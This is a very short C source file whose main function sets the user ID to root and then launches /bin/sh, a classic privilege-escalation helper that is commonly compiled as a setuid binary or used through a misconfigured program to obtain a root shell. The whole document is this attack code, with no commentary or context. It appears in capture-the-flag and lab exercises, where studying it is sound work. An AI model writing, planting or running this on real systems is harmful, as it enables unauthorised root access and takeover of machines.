int main() {
	setuid(0);
	execlp("/bin/sh", "/bin/sh", 0);
	return 0;
}
